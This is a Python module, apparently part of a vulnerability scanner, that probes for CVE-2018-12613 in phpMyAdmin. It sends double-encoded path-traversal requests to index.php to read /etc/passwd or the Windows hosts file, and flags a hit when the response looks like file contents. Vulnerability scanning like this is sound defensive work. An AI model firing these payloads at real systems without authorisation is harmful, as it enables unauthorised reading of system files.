#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2018_12613_payloads = [
    {'path': 'index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd'},
    {'path': 'index.php?target=db_sql.php%253f/../../../../../../../../C:/Windows/System32/drivers/etc/hosts'},
    {'path': 'index.php?target=db_sql.php%253f/../../../../../../../../C:\Windows\System32\drivers\etc\hosts'},
]

def cve_2018_12613_scan(self, clients):
    ''' 该漏洞在 index.php, 导致文件包含漏洞 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'FileInclude',
        'vul_id': 'CVE-2018-12613',
    }

    for payload in cve_2018_12613_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
